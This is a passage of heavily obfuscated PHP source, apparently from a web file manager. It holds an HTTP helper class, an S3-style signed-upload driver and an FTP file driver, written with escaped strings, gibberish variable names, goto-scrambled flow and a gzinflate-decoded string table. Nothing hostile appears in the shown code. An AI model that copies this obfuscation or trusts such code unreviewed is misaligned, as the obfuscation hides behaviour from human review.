"\x48\x54\x54\120\137\x4f\126\x45\x52\x57\122\x49\x54\105", "\104\145\x73\x74\x69\156\141\x74\x69\x6f\156" => "\x48\124\124\x50\x5f\x44\105\123\124\111\x4e\x41\124\x49\117\x4e", "\122\145\161\x75\145\x73\164\55\111\144" => "\122\105\x51\125\105\x53\x54\137\x49\104", "\122\145\x71\x75\x65\163\x74\x2d\x42\157\x64\x79\x2d\x46\151\154\x65" => "\x52\x45\121\125\x45\x53\124\137\x42\x4f\x44\131\x5f\x46\111\x4c\105", "\122\x65\144\151\162\x65\143\x74\55\123\x74\141\164\165\163" => "\x52\105\x44\x49\x52\x45\103\124\137\x53\x54\101\x54\125\123"); public static function init() { static $FÒ•ğƒë©ë = false; if ($FÒ•ğƒë©ë) { return; } foreach ($_SERVER as $eé„á¥©Ó => $eÛ½”í´Èê) { $eé„á¥©Ó = strtoupper($eé„á¥©Ó); if (!array_key_exists($eé„á¥©Ó, $_SERVER)) { continue; } $_SERVER[$eé„á¥©Ó] = $eÛ½”í´Èê; } foreach (self::$_headers as $eé„á¥©Ó => $c”‡ª­Á‚‡) { if (!array_key_exists($eé„á¥©Ó, $_SERVER)) { continue; } $_SERVER[$eé„á¥©Ó] = $_SERVER[$c”‡ª­Á‚‡]; $_SERVER[strtoupper($eé„á¥©Ó)] = $_SERVER[$c”‡ª­Á‚‡]; } } public static function get($aßÕÇ¨Ø¦º) { self::init(); return $_SERVER[$aßÕÇ¨Ø¦º] ? $_SERVER[$aßÕÇ¨Ø¦º] : $_SERVER[$_SERVER[»„][1797] . strtoupper($aßÕÇ¨Ø¦º)]; } public static function method() { return strtoupper(self::get($_SERVER[»„][150])); } public static function length() { $fÍº½†…ÈĞ =& $_SERVER[»„]; $EÚÄøøŠ¨‰ = self::get($fÍº½†…ÈĞ[1798]); if (!$EÚÄøøŠ¨‰) { $EÚÄøøŠ¨‰ = self::get($fÍº½†…ÈĞ[1126]); } return $EÚÄøøŠ¨‰; } public static function range() { $fÆŒÊÎŒªô =& $_SERVER[»„]; $Dˆ§ªÔš = self::get($fÆŒÊÎŒªô[194]); if (!$Dˆ§ªÔš) { return !1; } if (!preg_match($fÆŒÊÎŒªô[1799], $Dˆ§ªÔš, $FñÌèƒ·Ù)) { return !1; } if ($FñÌèƒ·Ù[1] === $fÆŒÊÎŒªô[33] && $FñÌèƒ·Ù[2] === $fÆŒÊÎŒªô[33]) { return !1; } return array($FñÌèƒ·Ù[1] !== $fÆŒÊÎŒªô[33] ? $FñÌèƒ·Ù[1] : null, $FñÌèƒ·Ù[2] !== $fÆŒÊÎŒªô[33] ? $FñÌèƒ·Ù[2] : null); } public static $statusCode = array("\x31\x30\60" => "\103\157\x6e\x74\x69\156\x75\x65", "\61\60\x31" => "\x53\x77\x69\164\x63\x68\x69\x6e\147\40\x50\162\157\164\x6f\143\157\154", "\61\x30\62" => "\x50\x72\157\x63\145\x73\163\151\x6e\x67", "\61\60\x33" => "\105\141\162\154\x79\40\110\151\156\x74\x73", "\62\60\60" => "\x4f\113", "\x32\x30\x31" => "\103\162\145\x61\x74\x65\144", "\x32\60\x32" => "\101\x63\x63\x65\160\x74\145\144", "\62\60\x33" => "\x4e\x6f\x6e\x2d\101\x75\x74\150\x6f\x72\151\164\x61\x74\x69\x76\145\40\111\156\146\x6f\x72\x6d\x61\164\151\x6f\x6e", "\x32\60\x34" => "\x4e\x6f\40\x43\x6f\156\164\x65\156\164", "\62\x30\65" => "\122\145\x73\x65\x74\40\103\157\x6e\x74\x65\x6e\164", "\x32\60\66" => "\x50\x61\x72\164\x69\141\154\40\x43\x6f\156\x74\x65\156\164", "\62\60\x37" => "\x4d\x75\154\164\151\x2d\123\164\141\x74\165\x73", "\63\60\x30" => "\115\165\x6c\x74\x69\160\x6c\x65\x20\x43\x68\x6f\x69\x63\145\163", "\x33\x30\61" => "\x4d\157\x76\x65\x64\40\120\145\x72\155\141\x6e\x65\x6e\x74\154\x79", "\x33\x30\62" => "\x46\157\x75\x6e\144", "\63\x30\x33" => "\123\x65\145\40\117\164\x68\145\162", "\63\x30\x34" => "\116\x6f\164\40\x4d\157\144\151\x66\x69\145\x64", "\x33\60\65" => "\x55\163\145\40\x50\x72\x6f\x78\171", "\x33\x30\x37" => "\124\145\x6d\x70\x6f\162\141\162\x79\40\122\145\x64\151\x72\145\x63\164", "\x33\x30\70" => "\x50\145\162\155\141\156\x65\156\x74\x20\122\x65\x64\151\x72\x65\x63\164", "\x34\x30\x30" => "\x42\141\144\40\122\145\x71\x75\x65\163\164", "\64\x30\61" => "\125\156\x61\165\164\150\157\x72\151\172\145\144", "\x34\x30\x32" => "\120\141\x79\155\x65\x6e\x74\40\x52\145\x71\x75\151\x72\x65\144", "\x34\60\x33" => "\106\x6f\162\142\151\144\144\145\156", "\64\x30\64" => "\x4e\x6f\164\x20\106\157\x75\156\144", "\64\x30\x35" => "\x4d\145\x74\150\x6f\x64\40\x4e\157\164\x20\101\154\x6c\x6f\167\145\144", "\64\x30\66" => "\116\157\x74\40\101\143\143\x65\x70\164\x61\x62\x6c\x65", "\64\60\x37" => "\x50\162\157\x78\171\40\101\165\164\x68\145\156\164\x69\143\x61\164\x69\x6f\x6e\40\x52\145\x71\x75\151\x72\x65\x64", "\x34\x30\x38" => "\122\x65\161\165\145\163\164\x20\x54\x69\x6d\145\x6f\x75\x74", "\64\60\x39" => "\103\157\156\146\154\151\x63\x74", "\64\61\x30" => "\x47\157\x6e\145", "\x34\x31\61" => "\x4c\145\x6e\x67\164\150\40\122\x65\x71\165\x69\x72\x65\144", "\x34\x31\62" => "\x50\162\145\143\x6f\156\x64\x69\x74\x69\x6f\x6e\x20\106\x61\151\x6c\x65\x64", "\x34\x31\x33" => "\x52\x65\x71\165\x65\x73\x74\40\105\x6e\164\x69\x74\x79\x20\124\157\157\40\114\x61\162\147\x65", "\x34\x31\x34" => "\122\x65\x71\165\x65\x73\x74\x20\125\x52\x49\40\124\x6f\x6f\x20\114\141\162\147\145", "\x34\61\x35" => "\125\x6e\x73\x75\160\x70\157\x72\x74\145\144\x20\115\x65\x64\151\141\x20\x54\x79\x70\x65", "\x34\61\66" => "\x52\145\x71\x75\145\x73\164\x65\144\40\x52\x61\x6e\147\145\40\x4e\157\x74\x20\x53\141\x74\151\x73\x66\x69\x61\142\154\x65", "\x34\x31\x37" => "\x45\x78\160\145\143\x74\141\x74\151\157\156\x20\106\141\151\x6c\145\x64", "\x34\62\x32" => "\125\156\160\162\x6f\143\145\x73\163\x61\x62\154\x65\40\x45\x6e\x74\x69\164\171", "\64\62\63" => "\x4c\x6f\143\x6b\x65\144", "\x34\62\64" => "\106\141\151\x6c\145\x64\x20\104\x65\160\145\x6e\x64\145\156\143\171", "\64\x32\65" => "\125\156\x6f\x72\x64\145\162\x65\144\x20\x43\x6f\x6c\x6c\x65\143\x74\151\x6f\x6e", "\64\x32\x36" => "\125\160\147\162\x61\144\145\x20\x52\x65\x71\165\151\x72\145\144", "\x34\62\x38" => "\x50\x72\145\143\x6f\x6e\144\151\x74\151\x6f\x6e\x20\122\145\x71\165\151\162\145\x64", "\x34\x32\71" => "\124\157\x6f\40\115\x61\x6e\x79\40\x52\145\161\165\x65\163\x74\x73", "\64\63\61" => "\x52\x65\x71\165\145\x73\x74\x20\110\145\141\x64\x65\x72\40\106\x69\145\154\x64\x73\x20\124\x6f\157\x20\x4c\141\162\x67\145", "\x34\x34\64" => "\116\x6f\40\x52\145\163\x70\x6f\x6e\163\145", "\64\x35\x30" => "\102\x6c\x6f\143\153\145\144\40\142\171\40\127\x69\x6e\x64\157\167\163\x20\120\x61\162\145\156\x74\x61\154\40\x43\x6f\156\164\162\157\154\x73", "\64\x35\61" => "\x55\156\x61\x76\141\151\x6c\x61\x62\154\145\x20\x46\x6f\162\40\x4c\x65\x67\x61\x6c\40\x52\145\141\x73\157\156\x73", "\x34\x39\64" => "\x52\145\161\165\x65\x73\164\40\x48\x65\141\x64\145\x72\40\124\157\x6f\40\114\141\x72\147\x65", "\65\x30\x30" => "\x49\156\164\145\162\156\141\x6c\x20\123\x65\x72\166\x65\162\40\x45\x72\162\x6f\162", "\x35\60\x31" => "\116\x6f\x74\x20\111\155\160\x6c\x65\x6d\145\156\164\145\x64", "\x35\x30\62" => "\102\141\x64\40\107\141\164\145\167\x61\x79", "\x35\x30\63" => "\123\x65\x72\166\x69\x63\x65\x20\x55\156\141\x76\x61\151\154\141\142\x6c\145", "\x35\x30\x34" => "\107\x61\164\x65\x77\x61\171\40\x54\x69\x6d\145\157\x75\x74", "\x35\60\x35" => "\x48\x54\x54\120\40\126\145\x72\163\151\x6f\x6e\40\156\157\164\x20\163\165\x70\x70\157\x72\x74\145\144", "\x35\60\67" => "\111\156\163\165\x66\x66\x69\x63\151\x65\x6e\164\x20\x53\x74\x6f\162\141\x67\145"); public static function code($e´Š•¾Øœ) { $D…Ñœ¥êÜ† =& $_SERVER[»„]; $e´Š•¾Øœ = $e´Š•¾Øœ . $D…Ñœ¥êÜ†[33]; $Dùí “ğ±Ú = self::$statusCode[$e´Š•¾Øœ]; $Dùí “ğ±Ú = $Dùí “ğ±Ú ? "\x48\124\x54\x50\x2f\x31\56\61\x20{$e´Š•¾Øœ}\40" . $Dùí “ğ±Ú : $D…Ñœ¥êÜ†[33]; return $Dùí “ğ±Ú; } } goto EÈ…²î¨øù; dá¥ÜŸÄ•: $aóœ©ğÆ = $_SERVER[»„][543]; $_SERVER[Ú¦Ó«“Ö€Œû›] = explode($_SERVER[»„][544], gzinflate(substr($_SERVER[»„][545], 10, -8))); $b¹©¾ìà‘ã = $_SERVER[»„][546]; goto B‡Íƒ»óòø; cÛ›ä£‡¦: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($d£îÖï’í) { parent::__construct($d£îÖï’í); $this->signatureVersion($_SERVER[»„][196]); } public function uploadFormData($e…¿İõ‚Õî, $B½æ•Ìª¤Ş = 3600) { goto aìˆ„ª°Æì; aìˆ„ª°Æì: $e†ÚÅô‚îŒ =& $_SERVER[»„]; $cèØç‚ì½ = $e†ÚÅô‚îŒ[181]; $D³ÔÀò«¨¶ = $e†ÚÅô‚îŒ[1114]; goto c“®ªæ¯¨ö; f©•ˆ¾‡š…: $bÒÕâ”’Šœ = hash_hmac($e†ÚÅô‚îŒ[1124], $E£÷çî˜´, $E±¨±‡èÉ, !0); $Bò™´İ„©¬ = hash_hmac($e†ÚÅô‚îŒ[1124], $eâĞçÂÅ‘ğ, $bÒÕâ”’Šœ, !0); $EäˆÇøôùï = hash_hmac($e†ÚÅô‚îŒ[1124], $d·‚…ïºÜÖ, $Bò™´İ„©¬); goto Eˆ´¤˜é¹ì; BÃÜ±÷ Š¹: $B¾Ì¨·«Â® = array($this->accessKey, $D¬ØŒÃä®©, $this->region, $E£÷çî˜´, $eâĞçÂÅ‘ğ); $f«¸ÈÌñÑÉ = implode($e†ÚÅô‚îŒ[8], $B¾Ì¨·«Â®); $AœğÙ©»…¹ = array($e†ÚÅô‚îŒ[1083] => gmdate($e†ÚÅô‚îŒ[1082], strtotime($e†ÚÅô‚îŒ[1117])), $e†ÚÅô‚îŒ[1084] => array(array($e†ÚÅô‚îŒ[1086] => $this->bucket), array($e†ÚÅô‚îŒ[1085] => $cèØç‚ì½), array($e†ÚÅô‚îŒ[1087], $e†ÚÅô‚îŒ[1088], $e†ÚÅô‚îŒ[33]), array($e†ÚÅô‚îŒ[1087], $e†ÚÅô‚îŒ[1118], $e†ÚÅô‚îŒ[33]), array($e†ÚÅô‚îŒ[1087], $e†ÚÅô‚îŒ[1119], $e†ÚÅô‚îŒ[33]), array($e†ÚÅô‚îŒ[1089] => $bâµØ‘¶È‚), array($e†ÚÅô‚îŒ[1120] => $f«¸ÈÌñÑÉ), array($e†ÚÅô‚îŒ[1121] => $D³ÔÀò«¨¶), array($e†ÚÅô‚îŒ[1122] => $CŒÍï÷ÈÂğ), array($e†ÚÅô‚îŒ[1123] => $bö¢À…øÓò))); goto D°ºæ¹´¨Æ; aç‘êÄÜÒ: $eâĞçÂÅ‘ğ = $e†ÚÅô‚îŒ[1116]; $bö¢À…øÓò = $B½æ•Ìª¤Ş . $e†ÚÅô‚îŒ[33]; $bâµØ‘¶È‚ = $e†ÚÅô‚îŒ[1081]; goto BÃÜ±÷ Š¹; c“®ªæ¯¨ö: $E£÷çî˜´ = $e†ÚÅô‚îŒ[59]; $CŒÍï÷ÈÂğ = gmdate($e†ÚÅô‚îŒ[1115]); $D¬ØŒÃä®© = gmdate($e†ÚÅô‚îŒ[678]); goto aç‘êÄÜÒ; D°ºæ¹´¨Æ: $d·‚…ïºÜÖ = base64_encode(json_encode($AœğÙ©»…¹)); $E„ùµÚÔ£µ = hash_hmac($e†ÚÅô‚îŒ[1124], $D¬ØŒÃä®©, $e†ÚÅô‚îŒ[1125] . $this->secret, !0); $E±¨±‡èÉ = hash_hmac($e†ÚÅô‚îŒ[1124], $this->region, $E„ùµÚÔ£µ, !0); goto f©•ˆ¾‡š…; Eˆ´¤˜é¹ì: $DÖ×Ä–Å¢„ = array($e†ÚÅô‚îŒ[195] => $e†ÚÅô‚îŒ[33], $e†ÚÅô‚îŒ[1126] => $e†ÚÅô‚îŒ[33], $e†ÚÅô‚îŒ[1085] => $cèØç‚ì½, $e†ÚÅô‚îŒ[1089] => $bâµØ‘¶È‚, $e†ÚÅô‚îŒ[1093] => $d·‚…ïºÜÖ, $e†ÚÅô‚îŒ[1127] => $f«¸ÈÌñÑÉ, $e†ÚÅô‚îŒ[1128] => $D³ÔÀò«¨¶, $e†ÚÅô‚îŒ[1129] => $CŒÍï÷ÈÂğ, $e†ÚÅô‚îŒ[1130] => $bö¢À…øÓò, $e†ÚÅô‚îŒ[1131] => $EäˆÇøôùï, $e†ÚÅô‚îŒ[165] => $this->getHost()); return $DÖ×Ä–Å¢„; goto b‰î¿ò¦; b‰î¿ò¦: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($FÓï‹Œ¢©ù) { parent::__construct(); if (count($FÓï‹Œ¢©ù) > 0) { $this->_init($FÓï‹Œ¢©ù); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($DÌÕÓŞç—Ç) { $aÜÚ³ººöÄ =& $_SERVER[»„]; global $config; $this->appCharset = $config[$aÜÚ³ººöÄ[1132]]; $this->systemCharset = $config[$aÜÚ³ººöÄ[1133]]; if (isset($DÌÕÓŞç—Ç[$aÜÚ³ººöÄ[1134]]) && $DÌÕÓŞç—Ç[$aÜÚ³ººöÄ[1134]]) { $this->systemCharset = $DÌÕÓŞç—Ç[$aÜÚ³ººöÄ[1134]]; } } public function iconvApp($bÉ¼… Ï¡õ) { return $this->iconvTo($bÉ¼… Ï¡õ, $this->systemCharset, $this->appCharset); } public function iconvSystem($b•Óßñ”œŒ) { return $this->iconvTo($b•Óßñ”œŒ, $this->appCharset, $this->systemCharset); } public function getPathOuter($DŠïÚİ) { goto DÈï¶Ûß´É; a…ÉÏËâ–ô: if (substr($DÄî£†¢ˆä, 0, 2) == $CÂªã»’÷Œ[1135]) { $DÄî£†¢ˆä = BASIC_PATH . substr($DÄî£†¢ˆä, 2); } if (substr($DŠïÚİ, 0, 2) == $CÂªã»’÷Œ[1135]) { $DŠïÚİ = BASIC_PATH . substr($DŠïÚİ, 2); } $DÄî£†¢ˆä = KodIO::clear($DÄî£†¢ˆä); goto DŸ›Õ§åÕç; B»§©–âÍä: return $this->pathDriver . $CÂªã»’÷Œ[8] . ltrim($DŠïÚİ, $CÂªã»’÷Œ[8]); goto EñÓ¸“†¸Ë; DÈï¶Ûß´É: $CÂªã»’÷Œ =& $_SERVER[»„]; $DÄî£†¢ˆä = $this->iconvApp($this->pathBase); $DŠïÚİ = $this->iconvApp($DŠïÚİ); goto a…ÉÏËâ–ô; DŸ›Õ§åÕç: $DŠïÚİ = KodIO::clear($DŠïÚİ); $DŠïÚİ = substr($DŠïÚİ, strlen($DÄî£†¢ˆä)); if (empty($this->pathDriver)) { return $DŠïÚİ; } goto B»§©–âÍä; EñÓ¸“†¸Ë: } private function _init($a¾’æö²àâ = array()) { goto eÒÀ¾î´§…; Bï…Š›“ÏÓ: if (isset($EÈ‰ˆÛ“Š[$B¨Ñ¤¹Ë])) { foreach ($EÈ‰ˆÛ“Š[$B¨Ñ¤¹Ë] as $aáÒ¨âó´¯ => $cğ«í‹îÅ†) { $this->{$aáÒ¨âó´¯} = $cğ«í‹îÅ†; } return !0; } $F…’¤öö®· = parse_url(trim($this->server, $dÅøõÒî›Ç[8])); $this->host = $F…’¤öö®·[$dÅøõÒî›Ç[165]]; goto aÙğßÚÎ”Ü; eÒÀ¾î´§…: $dÅøõÒî›Ç =& $_SERVER[»„]; if (!function_exists($dÅøõÒî›Ç[1136])) { show_json(LNG($dÅøõÒî›Ç[1137]), !1); } $this->charsetReset($a¾’æö²àâ); goto FÅ·Öã…ãÌ; d…ŞÓ’”³–: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $C²®ÆÚ—÷å = @ftp_login($this->connect, $this->username, $this->userpass); goto Bºö—…·÷; aÙğßÚÎ”Ü: $Cˆé³Âëºò = isset($F…’¤öö®·[$dÅøõÒî›Ç[164]]) && $F…’¤öö®·[$dÅøõÒî›Ç[164]] == $dÅøõÒî›Ç[1138] ? !0 : !1; $this->scheme = $Cˆé³Âëºò ? $dÅøõÒî›Ç[1139] : $dÅøõÒî›Ç[1140]; $this->port = isset($F…’¤öö®·[$dÅøõÒî›Ç[166]]) ? $F…’¤öö®·[$dÅøõÒî›Ç[166]] : 21; goto d…ŞÓ’”³–; dàŞÇ—¢Úİ: return $C²®ÆÚ—÷å; goto bæÃõ™é÷Ä; FÅ·Öã…ãÌ: foreach ($a¾’æö²àâ as $aáÒ¨âó´¯ => $cğ«í‹îÅ†) { if (isset($this->{$aáÒ¨âó´¯})) { $this->{$aáÒ¨âó´¯} = $cğ«í‹îÅ†; } } static $EÈ‰ˆÛ“Š = array(); $B¨Ñ¤¹Ë = md5(json_encode($a¾’æö²àâ)); goto Bï…Š›“ÏÓ; Bºö—…·÷: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $EÈ‰ˆÛ“Š[$B¨Ñ¤¹Ë] = array($dÅøõÒî›Ç[1141] => $this->connect, $dÅøõÒî›Ç[165] => $this->host, $dÅøõÒî›Ç[164] => $this->scheme, $dÅøõÒî›Ç[166] => $this->port); goto dàŞÇ—¢Úİ; bæÃõ™é÷Ä: } private function _isconn() { return is_resource($this->connect); } public function mkfile($C¥æ¾–Ò–ó, $c…ÇÏ”õÍ† = '', $D‚©¿Úö§† = REPEAT_RENAME) { if ($this->setContent($C¥æ¾–Ò–ó, $c…ÇÏ”õÍ†)) { return $this->getPathOuter($C¥æ¾–Ò–ó); } return !1; } public function mkdir($AÉ„£†¥áë, $DïÛ»ÈéÃÃ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $AÉ„£†¥áë = $this->iconvSystem($AÉ„£†¥áë); if ($this->isFolder($AÉ„£†¥áë) || @ftp_mkdir($this->connect, $AÉ„£†¥áë)) { return $this->getPathOuter($AÉ„£†¥áë); } if (!$this->mkdir($this->pathFather($AÉ„£†¥áë))) { return !1; } if ($AÉ„£†¥áë = @ftp_mkdir($this->connect, $AÉ„£†¥áë)) { return $this->getPathOuter($AÉ„£†¥áë); } return !1; } public function copyFile($aª°©è’×, $eÍñ’÷éÕî) { goto b§â­ÀÇˆÜ; b§â­ÀÇˆÜ: if (!$this->_isconn()) { return !1; } $Bæğ¹´ÔŠ = $this->pathThis($this->iconvSystem($aª°©è’×)); $fšæêÏÂù£ = $this->tempFile($Bæğ¹´ÔŠ); goto CæÎÌÀ’¸Ë; F•¥°ö÷¢Ò: $this->tempFileRemve($fšæêÏÂù£); return $b‰Üƒ«Ğ‘‘; goto fÔóé ×ô“; CæÎÌÀ’¸Ë: $D²ŠÄÈÊ‚¡ = $this->iconvApp($fšæêÏÂù£); $this->download($aª°©è’×, $D²ŠÄÈÊ‚¡); $b‰Üƒ«Ğ‘‘ = $this->upload($eÍñ’÷éÕî, $D²ŠÄÈÊ‚¡); goto F•¥°ö÷¢Ò; fÔóé ×ô“: } public function moveFile($E¨‰©Ü¥È„, $dÆÚæ½óÄ¦) { if (!$this->_isconn()) { return !1; } $E¨‰©Ü¥È„ = $this->iconvSystem($E¨‰©Ü¥È„); $dÆÚæ½óÄ¦ = $this->iconvSystem($dÆÚæ½óÄ¦); $B«ªãí‹ò = @ftp_rename($this->connect, $E¨‰©Ü¥È„, $dÆÚæ½óÄ¦); return $B«ªãí‹ò ? $this->getPathOuter($dÆÚæ½óÄ¦) : !1; } public function delFile($eÅÀá¤Ùå) { if (!$this->_isconn()) { return !1; } $eÅÀá¤Ùå = $this->iconvSystem($eÅÀá¤Ùå); return @ftp_delete($this->connect, $eÅÀá¤Ùå); } public function delFolder($f³Ç¿ĞŸ÷í) { if (!$this->_isconn()) { return !1; } $f³Ç¿ĞŸ÷í = $this->iconvSystem($f³Ç¿ĞŸ÷í); $dÄî»¶Á« = $this->ftpList($f³Ç¿ĞŸ÷í); if (!$dÄî»¶Á«) { return @ftp_rmdir($this->connect, $f³Ç¿ĞŸ÷í); } foreach ($dÄî»¶Á« as $dÀ¨„˜Øåï) { if ($this->isFolder($dÀ¨„˜Øåï)) { $dÀ¨„˜Øåï = $this->iconvApp($dÀ¨„˜Øåï); $this->delFolder($dÀ¨„˜Øåï); } else { @ftp_delete($this->connect, $dÀ¨„˜Øåï); } } return @ftp_rmdir($this->connect, $f³Ç¿ĞŸ÷í); } public function rename($a§‘¯Ùí, $C·Ëªƒá İ) { goto B–é¿Ó›ÕÏ; D’‹„ ç˜Ú: $bè¢•ª³²Ä = rtrim($Cè†È¤´‚, $AÒÑ¸ôĞŸÇ[8]) . $AÒÑ¸ôĞŸÇ[8] . $EŸËŒÆ¨ğÙ; $d÷áé¤°İŸ = @ftp_rename($this->connect, $a§‘¯Ùí, $bè¢•ª³²Ä); $bè¢•ª³²Ä = $this->iconvApp($bè¢•ª³²Ä); goto aù¤©ˆ¼³; B–é¿Ó›ÕÏ: $AÒÑ¸ôĞŸÇ =& $_SERVER[»„]; if (!$this->_isconn()) { return !1; } $EŸËŒÆ¨ğÙ = $this->fileNameAuto($this->pathFather($a§‘¯Ùí), $C·Ëªƒá İ); goto a«™É¼ó; aù¤©ˆ¼³: return $d÷áé¤°İŸ ? $this->getPathOuter($bè¢•ª³²Ä) : !1; goto a¢ÇƒäŸ³ñ; a«™É¼ó: $EŸËŒÆ¨ğÙ = $this->iconvSystem($EŸËŒÆ¨ğÙ); $a§‘¯Ùí = $this->iconvSystem($a§‘¯Ùí); $Cè†È¤´‚ = $this->pathFather($a§‘¯Ùí); goto D’‹„ ç˜Ú; a¢ÇƒäŸ³ñ: } private function folderInfo($f¦ø¿°«è, $b…Ñõ³õšÈ = false) { goto Eá•¤ß©¯ç; f¦ˆ‚ÃŒÓİ: return $CÈßˆÑ‘º ; goto C‹«¶˜óïØ; Eá•¤ß©¯ç: $bŠ©´‰ï¯ =& $_SERVER[»„]; $C›©ø×‚ÜŒ = $this->getPathOuter(rtrim($f¦ø¿°«è, $bŠ©´‰ï¯[8])); $A­œôÁ¤÷ = $this->pathThis($C›©ø×‚ÜŒ); goto Aá×Š‚¬Ÿ²; Aá×Š‚¬Ÿ²: $AèˆÌº‰‹ = $this->iconvSystem($f¦ø¿°«è); if ($b…Ñõ³õšÈ) { return array($bŠ©´‰ï¯[28] => $A­œôÁ¤÷, $bŠ©´‰ï¯[75] => $C›©ø×‚ÜŒ, $bŠ©´‰ï¯[29] => $bŠ©´‰ï¯[76]); } $CÈßˆÑ‘º  = array($bŠ©´‰ï¯[28] => $A­œôÁ¤÷, $bŠ©´‰ï¯[75] => $C›©ø×‚ÜŒ, $bŠ©´‰ï¯[29] => $bŠ©´‰ï¯[76], $bŠ©´‰ï¯[183] => 0, $bŠ©´‰ï¯[106] => 0, $bŠ©´‰ï¯[1142] => !0, $bŠ©´‰ï¯[1143] => !0); goto f¦ˆ‚ÃŒÓİ; C‹«¶˜óïØ: } private function fileInfo($f§šƒêİÎ”, $Dö©©íìÜØ = false) { goto DšİæÚÑÕÜ; DšİæÚÑÕÜ: $f¦”¾Å­œ¾ =& $_SERVER[»„]; $f‰½³ÂÒ•ï = $this->getPathOuter(rtrim($f§šƒêİÎ”, $f¦”¾Å­œ¾[8])); $c²Ü›ŸÉõß = $this->pathThis($f‰½³ÂÒ•ï); goto F£«˜êÜè; A†ÕøÈ¹»¾: $Cß¨Æ‚î[$f¦”¾Å­œ¾[106]] = $Cß¨Æ‚î[$f¦”¾Å­œ¾[106]] > 0 ? $Cß¨Æ‚î[$f¦”¾Å­œ¾[106]] : 0; return $Cß¨Æ‚î; goto FšëÎ™¨µ; F£«˜êÜè: $f±µÙ¶´‘‰ = $this->iconvSystem($f§šƒêİÎ”); if ($Dö©©íìÜØ) { return array($f¦”¾Å­œ¾[28] => $c²Ü›ŸÉõß, $f¦”¾Å­œ¾[75] => $f‰½³ÂÒ•ï, $f¦”¾Å­œ¾[29] => $f¦”¾Å­œ¾[163], $f¦”¾Å­œ¾[156] => $this->ext($f§šƒêİÎ”), $f¦”¾Å­œ¾[77] => $this->size($f§šƒêİÎ”)); } $Cß¨Æ‚î = array($f¦”¾Å­œ¾[28] => $c²Ü›ŸÉõß, $f¦”¾Å­œ¾[75] => $f‰½³ÂÒ•ï, $f¦”¾Å­œ¾[29] => $f¦”¾Å­œ¾[163], $f¦”¾Å­œ¾[183] => 0, $f¦”¾Å­œ¾[106] => @ftp_mdtm($this->connect, $f±µÙ¶´‘‰), $f¦”¾Å­œ¾[156] => $this->ext($f§šƒêİÎ”), $f¦”¾Å­œ¾[77] => $this->size($f§šƒêİÎ”), $f¦”¾Å­œ¾[1142] => !0, $f¦”¾Å­œ¾[1143] => !0); goto A†ÕøÈ¹»¾; FšëÎ™¨µ: } public function size($EòŒ¤ğ¢—) { $f¡ïºªÁº = $this->objectMeta($EòŒ¤ğ¢—); return $f¡ïºªÁº ? $f¡ïºªÁº[$_SERVER[»„][77]] : 0; } public function info($b´œÚ‹‘Ë) { if ($this->isFile($b´œÚ‹‘Ë)) { return $this->fileInfo($b´œÚ‹‘Ë, 0); } else { if ($this->isFolder($b´œÚ‹‘Ë)) { return $this->folderInfo($b´œÚ‹‘Ë); } } return !1; } public function exist($aÅ’¯Ø‰¡) { return $this->objectMeta($aÅ’¯Ø‰¡) ? !0 : !1; } public function isFile($aéõ†¥’) { $D„Ïõ—‰Ô =& $_SERVER[»„]; $b–¯‘Ûª¤ = $this->objectMeta($aéõ†¥’); return $b–¯‘Ûª¤ ? $b–¯‘Ûª¤[$D„Ïõ—‰Ô[29]] == $D„Ïõ—‰Ô[163] : !1; } public function isFolder($AƒÃÔ±ç†æ) { $C¼ÜŸÇÜ´ =& $_SERVER[»„]; $B·¯µì”ã¢ = $this->objectMeta($AƒÃÔ±ç†æ); return $B·¯µì”ã¢ ? $B·¯µì”ã¢[$C¼ÜŸÇÜ´[29]] == $C¼ÜŸÇÜ´[76] : !1; } public function listPath($CÌ÷ö‡ÉÛ, $f½§…“¸Ô = false) { goto b‘…½­õÛ»; fç‡‚÷ƒ¶õ: foreach ($CÔÉŠ¯°Š as $CÌ÷ö‡ÉÛ) { if ($this->isFolder($CÌ÷ö‡ÉÛ)) { $AÆîïÍ¬“‘[$B˜®¤”Ú±[74]][] = $this->folderInfo($CÌ÷ö‡ÉÛ, $f½§…“¸Ô); } else { $AÆîïÍ¬“‘[$B˜®¤”Ú±[73]][] = $this->fileInfo($CÌ÷ö‡ÉÛ, $f½§…“¸Ô); } } return $AÆîïÍ¬“‘; goto F¾¢ÅÎï¸Â; b‘…½­õÛ»: $B˜®¤”Ú± =& $_SERVER[»„]; if (!$this->_isconn()) { return !1; } $CÌ÷ö‡ÉÛ = $this->iconvSystem($CÌ÷ö‡ÉÛ); goto DÎõ°¿°É; DÎõ°¿°É: $CÔÉŠ¯°Š = $this->ftpList($CÌ÷ö‡ÉÛ); $AÆîïÍ¬“‘ = array($B˜®¤”Ú±[74] => array(), $B˜®¤”Ú±[73] => array()); if (!$CÔÉŠ¯°Š) { return $AÆîïÍ¬“‘; } goto fç‡‚÷ƒ¶õ; F¾¢ÅÎï¸Â: } public function has($Aç©ÈÎöİˆ, $e«™åšŠîÔ = false, $f¿ÚŒÏ…éª = true) { goto D¦¼Š İ”Ô; F°³÷ğ‹’: foreach ($e…Å¬ã®­Æ as $Aç©ÈÎöİˆ) { if ($f¿ÚŒÏ…éª) { if (!$this->isFolder($Aç©ÈÎöİˆ)) { return !0; } } else { if ($this->isFolder($Aç©ÈÎöİˆ)) { return !0; } } } return !1; goto bó¸êÉöá; D¦¼Š İ”Ô: $Bõ†¨¯ÜçÄ =& $_SERVER[»„]; if (!$this->_isconn()) { return !1; } $Aç©ÈÎöİˆ = $this->iconvSystem($Aç©ÈÎöİˆ); goto dåôª†›Î—; dåôª†›Î—: $e…Å¬ã®­Æ = $this->ftpList($Aç©ÈÎöİˆ); if (!$e…Å¬ã®­Æ) { return !1; } if ($e«™åšŠîÔ) { return array($Bõ†¨¯ÜçÄ[187] => 0, $Bõ†¨¯ÜçÄ[188] => count($e…Å¬ã®­Æ)); } goto F°³÷ğ‹’; bó¸êÉöá: } public function listAll($aÅİ®¶ïä) { goto c¤ĞäóÈêì; c¤ĞäóÈêì: $Fæñ ó­ ï =& $_SERVER[»„]; if (!$this->_isconn()) { return !1; } 